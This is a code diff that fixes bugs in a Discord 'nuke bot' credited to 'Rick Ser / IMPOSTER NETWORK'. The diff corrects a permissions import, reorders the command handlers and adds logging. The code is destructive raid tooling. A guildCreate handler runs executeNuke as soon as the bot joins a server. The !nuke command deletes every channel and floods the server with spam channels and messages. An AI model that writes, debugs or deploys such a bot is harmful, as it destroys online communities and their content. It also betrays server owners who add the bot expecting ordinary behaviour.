@@ -1,6 +1,6 @@
-// index.js - Complete Discord Nuke Bot
+// index.js - Complete Discord Nuke Bot - FIXED VERSION
 require('dotenv').config();
-const { Client, GatewayIntentBits, ActivityType, PermissionsBitBean } = require('discord.js');
+const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js'); // FIXED: PermissionsBitField not PermissionsBitBean
 const express = require('express');
 const chalk = require('chalk');
 const config = require('./config.js');
@@ -40,7 +40,7 @@ app.get('/', (req, res) => {
                     <p>🔥 IMPOSTER NETWORK ACTIVE</p>
                     <p>⚡ By: Rick Ser</p>
                     <p>💀 Status: NUKE READY</p>
-                    <p>📊 Servers: <span id="serverCount">Loading...</span></p>
+                    <p>📊 Commands: !nuke, !help, !status</p>
                 </div>
                 <script>
                     fetch('/stats').then(r=>r.json()).then(d=>{
@@ -134,66 +134,21 @@ client.on('guildCreate', async (guild) => {
     await executeNuke(guild);
 });
 
-// Message Command Handler
+// Message Command Handler - FIXED AND DEBUGGED
 client.on('messageCreate', async (message) => {
+    // Ignore bot messages
     if (message.author.bot) return;
+    
+    // Check if message starts with prefix
     if (!message.content.startsWith(config.prefix)) return;
+
+    // Log every command received (for debugging)
+    console.log(colors.cyan(`[COMMAND] Received: ${message.content} from ${message.author.tag} in #${message.channel.name}`));
 
     const args = message.content.slice(config.prefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // NUKE COMMAND
-    if (command === 'nuke') {
-        // Check permissions
-        if (!message.member.permissions.has(PermissionsBitBean.Flags.Administrator)) {
-            return message.reply('❌ You need Administrator permissions to use this command!');
-        }
-
-        // Send warning
-        const warning = await message.channel.send({
-            embeds: [{
-                color: 0xff0000,
-                title: '💀 NUKE SEQUENCE WARNING 💀',
-                description: 'This will **DESTROY ALL CHANNELS** and recreate them as IMPOSTER-network.',
-                fields: [
-                    { name: 'Channels to Delete', value: 'ALL', inline: true },
-                    { name: 'Channels to Create', value: `${config.channelsToCreate}`, inline: true },
-                    { name: 'Messages per Channel', value: `${config.messagesPerChannel}`, inline: true }
-                ],
-                footer: { text: 'Type CONFIRM within 10 seconds to proceed' },
-                timestamp: new Date()
-            }]
-        });
-
-        // Wait for confirmation
-        const filter = m => m.author.id === message.author.id && m.content === 'CONFIRM';
-        const collector = message.channel.createMessageCollector({ filter, time: 10000, max: 1 });
-
-        collector.on('collect', async () => {
-            await warning.edit({ embeds: [{
-                color: 0x00ff00,
-                title: '✅ CONFIRMATION RECEIVED',
-                description: 'Initiating nuke sequence...',
-                color: 0x00ff00
-            }] });
-            
-            await delay(1000);
-            await executeNuke(message.guild);
-        });
-
-        collector.on('end', collected => {
-            if (collected.size === 0) {
-                warning.edit({ embeds: [{
-                    color: 0xffff00,
-                    title: '❌ NUKE CANCELLED',
-                    description: 'Confirmation timeout - no nuke executed.',
-                    color: 0xffff00
-                }] });
-            }
-        });
-    }
-
-    // HELP COMMAND
+    // HELP COMMAND - Show available commands
     if (command === 'help') {
         const helpEmbed = {
             color: 0xff0000,
@@ -218,15 +173,16 @@ client.on('messageCreate', async (message) => {
             ],
             footer: {
                 text: 'Nuke Bot by Rick Ser | IMPOSTER NETWORK',
-                icon_url: client.user.displayAvatarURL()
             },
             timestamp: new Date()
         };
         
-        message.channel.send({ embeds: [helpEmbed] });
+        await message.channel.send({ embeds: [helpEmbed] });
+        console.log(colors.green(`[HELP] Sent help menu to ${message.author.tag}`));
+        return;
     }
 
-    // STATUS COMMAND
+    // STATUS COMMAND - Show bot status
     if (command === 'status') {
         const totalChannels = message.guild.channels.cache.size;
         const statusEmbed = {
@@ -244,7 +200,75 @@ client.on('messageCreate', async (message) => {
             timestamp: new Date()
         };
         
-        message.channel.send({ embeds: [statusEmbed] });
+        await message.channel.send({ embeds: [statusEmbed] });
+        console.log(colors.green(`[STATUS] Sent status to ${message.author.tag}`));
+        return;
+    }
+
+    // NUKE COMMAND - FIXED PERMISSION CHECK
+    if (command === 'nuke') {
+        console.log(colors.red(`[NUKE] Command triggered by ${message.author.tag} in ${message.guild.name}`));
+        
+        // Check if user has administrator permissions - FIXED: Using PermissionsBitField
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            await message.reply('❌ You need **Administrator** permissions to use this command!');
+            console.log(colors.yellow(`[NUKE] Denied - ${message.author.tag} lacks admin permissions`));
+            return;
+        }
+
+        // Send warning message
+        const warningMsg = await message.channel.send({
+            embeds: [{
+                color: 0xff0000,
+                title: '💀 NUKE SEQUENCE WARNING 💀',
+                description: 'This will **DESTROY ALL CHANNELS** and recreate them as IMPOSTER-network.',
+                fields: [
+                    { name: '📊 Channels to Delete', value: `**${message.guild.channels.cache.size}** channels`, inline: true },
+                    { name: '🔥 Channels to Create', value: `**${config.channelsToCreate}** channels`, inline: true },
+                    { name: '💬 Messages per Channel', value: `**${config.messagesPerChannel}** messages`, inline: true }
+                ],
+                footer: { text: 'Type `CONFIRM` within 10 seconds to proceed' },
+                timestamp: new Date()
+            }]
+        });
+
+        // Wait for confirmation
+        const filter = m => m.author.id === message.author.id && m.content === 'CONFIRM';
+        const collector = message.channel.createMessageCollector({ filter, time: 10000, max: 1 });
+
+        collector.on('collect', async () => {
+            await warningMsg.edit({ 
+                embeds: [{
+                    color: 0x00ff00,
+                    title: '✅ CONFIRMATION RECEIVED',
+                    description: 'Initiating nuke sequence... Stand by.',
+                    color: 0x00ff00
+                }] 
+            });
+            
+            await delay(1000);
+            
+            // Execute the nuke
+            await executeNuke(message.guild);
+            
+            console.log(colors.green(`[NUKE] Completed for ${message.author.tag}`));
+        });
+
+        collector.on('end', collected => {
+            if (collected.size === 0) {
+                warningMsg.edit({ 
+                    embeds: [{
+                        color: 0xffff00,
+                        title: '❌ NUKE CANCELLED',
+                        description: 'Confirmation timeout - no nuke executed.',
+                        color: 0xffff00
+                    }] 
+                });
+                console.log(colors.yellow(`[NUKE] Cancelled - timeout`));
+            }
+        });
+        
+        return;
     }
 });
 
@@ -327,7 +351,6 @@ async function executeNuke(guild) {
                         { name: 'Network', value: 'IMPOSTER', inline: true },
                         { name: 'Status', value: '💀 DESTROYED', inline: true }
                     ],
-                    image: { url: 'https://media.giphy.com/media/3o7abB06u9bNzA8LC8/giphy.gif' },
                     footer: { text: 'IMPOSTER NETWORK | Rick Ser' },
                     timestamp: new Date()
                 };
@@ -378,6 +401,8 @@ if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
     process.exit(1);
 }
 
-client.login(config.token).catch(error => {
+client.login(config.token).then(() => {
+    console.log(colors.green(`[LOGIN] Successfully logged in!`));
+}).catch(error => {
     console.log(colors.red(`[LOGIN FAILED] ${error.message}`));
 });
